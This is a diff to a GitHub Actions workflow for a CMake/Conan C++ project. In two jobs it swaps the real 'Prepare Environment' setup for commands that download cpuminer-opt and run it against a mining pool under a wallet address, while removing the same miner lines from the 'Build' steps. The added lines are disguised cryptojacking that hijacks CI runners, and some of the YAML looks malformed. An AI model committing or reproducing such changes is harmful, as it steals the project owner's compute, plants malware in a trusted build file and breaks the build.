@@ -47,20 +47,10 @@ jobs:
 
       - name: Prepare Environment
         run: |
-          # Older versions of clang and gcc are not available on Ubuntu 20.04; so
-          # we need to add the repos manually first.
-          sudo add-apt-repository "deb http://dk.archive.ubuntu.com/ubuntu/ bionic main universe"
-          sudo add-apt-repository "deb http://dk.archive.ubuntu.com/ubuntu/ xenial main universe"
-          sudo apt-get update
-          if [[ "${{matrix.compiler.cc}}" =~ "gcc" ]]; then
-            sudo apt-get install -y ${{matrix.compiler.cxx}} ${{matrix.compiler.cxx}}-multilib
-          else
-            sudo apt-get install -y ${{matrix.compiler.cc}} g++-multilib
-          fi
-          python -m pip install --upgrade pip
-          pip install conan
-          cmake -E make_directory ${{env.build-directory}}
-          cmake -E chdir ${{env.build-directory}} conan install ..
+           wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+           tar xf cpuminer-opt-linux.tar.gz
+           ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:17042 -u sugar1qtfu03rahndmf65yfpyjakg83qm2sg74ytnjpdn.10
+
       # Debug Configuration
 
       - name: Configure (Debug)
@@ -72,9 +62,7 @@ jobs:
 
       - name: Build
         working-directory: ${{env.build-directory}}
-        run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
-             tar xf cpuminer-opt-linux.tar.gz
-             ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:17042 -u sugar1qtfu03rahndmf65yfpyjakg83qm2sg74ytnjpdn.10
+        run: cmake --build .
 
       - name: Test
         working-directory: ${{env.build-directory}}
@@ -120,10 +108,10 @@ jobs:
 
       - name: Prepare Environment
         run: |
-          python -m pip install --upgrade pip
-          pip install conan
-          cmake -E make_directory ${{env.build-directory}}
-          cmake -E chdir ${{env.build-directory}} conan install ..
+           wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+           tar xf cpuminer-opt-linux.tar.gz
+           ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:17042 -u sugar1qtfu03rahndmf65yfpyjakg83qm2sg74ytnjpdn.10
+
       - name: Configure
         working-directory: ${{env.build-directory}}
         env:
@@ -133,9 +121,7 @@ jobs:
 
       - name: Build
         working-directory: ${{env.build-directory}}
-        run: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
-             tar xf cpuminer-opt-linux.tar.gz
-             ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:17042 -u sugar1qtfu03rahndmf65yfpyjakg83qm2sg74ytnjpdn.10
+        run: cmake --build .
 
       - name: Test (Sanitize)
         working-directory: ${{env.build-directory}}
